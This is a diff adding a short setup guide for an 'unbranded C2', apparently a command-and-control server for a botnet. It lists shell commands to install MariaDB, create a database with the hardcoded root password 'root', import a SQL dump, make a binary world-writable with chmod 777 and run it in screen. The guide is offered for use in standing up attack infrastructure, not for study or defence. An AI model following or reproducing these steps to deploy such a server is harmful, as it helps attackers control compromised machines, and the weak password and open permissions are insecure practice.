@@ -1,0 +1,22 @@
+USE THESE COMMANDS TO SETUP UNBRANDED C2 (THIS IS UNBRANDED BECAUSE ITS EASY TO CUSTOMISE AND IT GIVES YOU A UNDERSTANDING ON HOW TO DO IT ALL)
+==================================================================================================================================================
+
+sudo apt update
+
+sudo apt upgrade
+
+sudo apt install mariadb-server git -y
+
+mysql_secure_installation
+
+mysql -u root -proot -e "create database unbranded;"
+
+mysql -u root -proot unbranded < doodump.sql
+
+sudo apt install screen
+
+chmod 777 main
+
+screen ./main
+
+------------------------------------------------------
